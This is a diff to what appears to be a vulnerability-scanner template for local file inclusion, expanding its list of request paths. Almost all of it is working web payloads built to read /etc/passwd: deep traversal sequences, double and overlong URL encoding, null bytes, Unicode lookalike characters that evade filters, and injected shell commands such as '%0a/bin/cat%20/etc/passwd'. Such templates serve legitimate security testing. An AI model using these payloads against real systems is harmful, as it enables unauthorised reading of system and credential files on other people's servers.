@@ -3,7 +3,10 @@ info:
   name: storenth LFI
   author: storenth
   severity: high
-  reference: https://blog.cobalt.io/a-pentesters-guide-to-file-inclusion-8fdfc30275da
+  reference: |
+    - https://blog.cobalt.io/a-pentesters-guide-to-file-inclusion-8fdfc30275da
+    - https://github.com/filedescriptor/Unicode-Mapping-on-Domain-names
+    - https://github.com/emadshanab/LFI-Payload-List/blob/master/LFI%20payloads.txt
   tags: storenth,lfi
 
 requests:
@@ -11,6 +14,9 @@ requests:
     path:
       - "{{BaseURL}}../../../../../../../../../../../../../../../../etc/passwd"
       - "{{BaseURL}}cat%20/etc/passwd"
+      - "{{BaseURL}}$aaaaaaa/bin$bbbbbb/cat$ccccccc"
+      - "{{BaseURL}}$dddddddd/etc$eeeeeee/passwd$ggggggg"
+      - "{{BaseURL}}/???/??t+/???/??ss??"
       - "{{BaseURL}}%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
       - "{{BaseURL}}user/local/../../../../../../../../../../../../../../../../../../../etc/passwd/../../../../../../../../../../../../../../../../../../../etc/passwd"
       - '{{BaseURL}}\..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd'
@@ -22,9 +28,28 @@ requests:
       - "{{BaseURL}}%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
       - "{{BaseURL}}..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
       - "{{BaseURL}}\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd"
+      - "{{BaseURL}}../../../../../../../../../../../../../../../../𝘌𝙏𝘾/𝙋𝘼𝙎𝙎𝙒𝘿"
+      - "{{BaseURL}}../../../../../../../../../../../../../../../../ℯ𝐓Ⓒ/𝐩ⓐsswd"
+      - "{{BaseURL}}../../../../../../../../../../../../../../../../ⅇⓉⒸ/🄿𝘼𝙎𝙎𝙒𝘿"
+      - "{{BaseURL}}../../../../../../../../../../../../../../../../🄴🅃🄲/🄿🄰🅂🅂🅆🄳"
+      - "{{BaseURL}}cat%20/🄴🅃🄲/🄿🄰🅂🅂🅆🄳"
+      - "{{BaseURL}}cat%20/ℯ𝙏𝘾/𝙋𝘼𝙎𝙎𝙒𝘿"
+      - "{{BaseURL}}cat%20/ℯ𝐓Ⓒ/𝐩?sswd"
+      - "{{BaseURL}}../../../etc/passwd%00"
+      - "{{BaseURL}}%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd"
+      - "{{BaseURL}}....\/....\/....\/etc/passwd"
+      - "{{BaseURL}}..%252f..%252f..%252fetc%252fpasswd"
+      - "{{BaseURL}}..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+      - "{{BaseURL}}%252e%252e%252fetc%252fpasswd%00"
+      - "{{BaseURL}}%252e%252e%252fetc%252fpasswd"
+      - "{{BaseURL}}a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\."
+      - "{{BaseURL}}/var/www/../../etc/passwd"
+      - "{{BaseURL}}..///////..////..//////etc/passwd"
+      - "{{BaseURL}}%0a/bin/cat%20/etc/passwd"
+      - "{{BaseURL}}..%%32%%66..%%32%%66..%%32%%66etc%%32%%66passwd"
     headers:
       User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36"
-          
+
 
     # matchers-condition: and
     matchers:
